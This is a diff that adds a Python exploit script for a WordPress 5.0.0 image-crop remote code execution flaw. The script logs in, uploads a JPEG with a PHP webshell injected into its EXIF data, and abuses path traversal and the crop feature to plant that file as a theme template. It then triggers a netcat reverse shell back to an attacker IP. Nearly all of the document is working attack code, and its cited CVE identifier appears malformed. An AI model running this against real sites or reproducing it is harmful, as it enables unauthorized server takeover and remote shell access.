@@ -1,0 +1,186 @@
+# Exploit Title: WordPress 5.0.0 - Image Remote Code Execution
+# Date: 2020-02-01
+# Exploit Authors: OUSSAMA RAHALI ( aka V0lck3r)
+# Discovery Author : RIPSTECH Technology
+# Version: WordPress 5.0.0 and <= 4.9.8 .
+# References : CVE-2019-89242 | CVE-2019-89242  | https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/
+
+#/usr/bin/env python3
+
+import requests
+import re
+import sys
+from datetime import datetime
+
+banner = """
+
+__        __            _                           ____   ____ _____ 
+\ \      / /__  _ __ __| |_ __  _ __ ___  ___ ___  |  _ \ / ___| ____|
+ \ \ /\ / / _ \| '__/ _` | '_ \| '__/ _ \/ __/ __| | |_) | |   |  _|  
+  \ V  V / (_) | | | (_| | |_) | | |  __/\__ \__ \ |  _ <| |___| |___ 
+   \_/\_/ \___/|_|  \__,_| .__/|_|  \___||___/___/ |_| \_\\____|_____|
+                         |_|                                        
+                         			5.0.0 and <= 4.9.8
+"""
+print(banner)
+print("usage :")
+print("=======")
+usage = 'python3 RCE_wordpress.py http://<IP>:<PORT>/ <Username> <Password> <WordPress_theme>'
+print(usage)
+
+url = sys.argv[1]
+username = sys.argv[2]
+password = sys.argv[3]
+wp_theme = sys.argv[4] # wpscan results
+
+lhost = '10.10.10.10' #attacker ip
+lport = '4141' #listening port
+
+date = str(datetime.now().strftime('%Y'))+'/'+str(datetime.now().strftime('%m'))+'/'
+
+imagename = 'gd.jpg'
+# ======
+# Note :
+# ======
+# It could be any jpg image, BUT there are some modifications first : 
+# 1- image name as : "gd.jpg"
+# 2- place the image in the same directory as this exploit.
+# 3- inject the php payload via exiftool : exiftool gd.jpg -CopyrightNotice="<?=\`\$_GET[0]\`?>"
+
+data = {
+	'log':username,
+	'pwd':password,
+	'wp-submit':'Log In',
+	'redirect_to':url+'wp-admin/',
+	'testcookie':1
+}
+
+r = requests.post(url+'wp-login.php',data=data)
+
+if r.status_code == 200:
+	print("[+] Login successful.\n")
+else:
+	print("[-] Failed to login.")
+	exit(0)
+
+cookies = r.cookies
+
+print("[+] Getting Wp Nonce ... ")
+
+res = requests.get(url+'wp-admin/media-new.php',cookies=cookies)
+wp_nonce_list = re.findall(r'name="_wpnonce" value="(\w+)"',res.text)
+
+if len(wp_nonce_list) == 0 :
+	print("[-] Failed to retrieve the _wpnonce \n")
+	exit(0)
+else :
+	wp_nonce = wp_nonce_list[0]
+	print("[+] Wp Nonce retrieved successfully ! _wpnonce : " + wp_nonce+"\n")
+
+print("[+] Uploading the image ... ")
+
+data = {
+	'name': 'gd.jpg',
+	'action': 'upload-attachment',
+	'_wpnonce': wp_nonce
+}
+
+image = {'async-upload': (imagename, open(imagename, 'rb'))}
+r_upload = requests.post(url+'wp-admin/async-upload.php', data=data, files=image, cookies=cookies)
+if r_upload.status_code == 200:
+	image_id = re.findall(r'{"id":(\d+),',r_upload.text)[0]
+	_wp_nonce=re.findall(r'"update":"(\w+)"',r_upload.text)[0]
+	print('[+] Image uploaded successfully ! Image ID :'+ image_id+"\n")
+else : 
+	print("[-] Failed to receive a response for uploaded image ! try again . \n")
+	exit(0)
+
+print("[+] Changing the path ... ")
+
+
+data = {
+	'_wpnonce':_wp_nonce,
+	'action':'editpost',
+	'post_ID':image_id,
+	'meta_input[_wp_attached_file]':date+imagename+'?/../../../../themes/'+wp_theme+'/rahali'
+}
+
+res = requests.post(url+'wp-admin/post.php',data=data, cookies=cookies)
+if res.status_code == 200:
+	print("[+] Path has been changed successfully. \n")
+else :
+	print("[-] Failed to change the path ! Make sure the theme is correcte .\n")
+	exit(0)
+
+print("[+] Getting Ajax nonce ... ")
+
+data = {
+	'action':'query-attachments',
+	'post_id':0,
+	'query[item]':43,
+	'query[orderby]':'date',
+	'query[order]':'DESC',
+	'query[posts_per_page]':40,
+	'query[paged]':1
+}
+
+res = requests.post(url+'wp-admin/admin-ajax.php',data=data, cookies=cookies)
+ajax_nonce_list=re.findall(r',"edit":"(\w+)"',res.text)
+
+if res.status_code == 200 and len(ajax_nonce_list) != 0 :
+	ajax_nonce = ajax_nonce_list[0]
+	print('[+] Ajax Nonce retrieved successfully ! ajax_nonce : '+ ajax_nonce+'\n')
+else :
+	print("[-] Failed to retrieve ajax_nonce.\n")
+	exit(0)
+
+
+print("[+] Cropping the uploaded image ... ")
+
+data = {
+	'action':'crop-image',
+	'_ajax_nonce':ajax_nonce,
+	'id':image_id,
+	'cropDetails[x1]':0,
+	'cropDetails[y1]':0,
+	'cropDetails[width]':200,
+	'cropDetails[height]':100,
+	'cropDetails[dst_width]':200,
+	'cropDetails[dst_height]':100
+}
+
+res = requests.post(url+'wp-admin/admin-ajax.php',data=data, cookies=cookies)
+if res.status_code == 200:
+	print("[+] Done . \n")
+else :
+	print("[-] Erorr ! Try again \n")
+	exit(0)
+
+print("[+] Creating a new post to include the image... ")
+
+res = requests.post(url+'wp-admin/post-new.php', cookies=cookies)
+if res.status_code == 200:
+	_wpnonce = re.findall(r'name="_wpnonce" value="(\w+)"',res.text)[0]
+	post_id = re.findall(r'"post":{"id":(\w+),',res.text)[0]
+	print("[+] Post created successfully . \n")
+else :
+	print("[-] Erorr ! Try again \n")
+	exit(0)
+
+data={
+	'_wpnonce':_wpnonce,
+	'action':'editpost',
+	'post_ID':post_id,
+	'post_title':'RCE poc by v0lck3r',
+	'post_name':'RCE poc by v0lck3r',
+	'meta_input[_wp_page_template]':'cropped-rahali.jpg'
+}
+res = requests.post(url+'wp-admin/post.php',data=data, cookies=cookies)
+if res.status_code == 200:
+	print("[+] POC is ready at : "+url+'?p='+post_id+'&0=id\n')
+	print("[+] Executing payload !")
+	requests.get(f"{url}?p={post_id}&0=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20{lhost}%20{lport}%20%3E%2Ftmp%2Ff",cookies=cookies)
+
+else :
+	print("[-] Erorr ! Try again (maybe change the payload) \n")
+	exit(0)
